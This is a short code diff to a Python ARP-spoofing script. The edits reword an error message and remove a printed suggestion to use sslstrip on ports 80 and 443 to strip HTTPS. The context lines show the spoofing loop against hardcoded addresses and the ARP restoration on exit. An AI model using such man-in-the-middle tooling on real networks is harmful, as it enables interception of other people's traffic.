@@ -86,10 +86,10 @@ else:
 try:
     target_mac_address = get_mac(ip_address_of_target)
 except IndexError:
-    print("The IP address you entered is either not up or an unknown error occoured. Exiting...")
+    print("The IP address you entered is either not valid or an unknown error occoured. Exiting...")
     exit(0)
-print("Use sslstrip on port 80 and 443 to strip https.")
-print("\nSpoofing...\n")
+
+print("Spoofing...\n")
 
 sent_packets_count = 0
 
@@ -99,7 +99,6 @@ try:
         spoof("10.10.10.2", "10.10.10.12")
         sent_packets_count = sent_packets_count + 2
         print("\r[+] Packets sent: " + str(sent_packets_count), end="")
-
         time.sleep(1)
 except KeyboardInterrupt:
     print("\n\nRestoring ARP tables and exiting...")
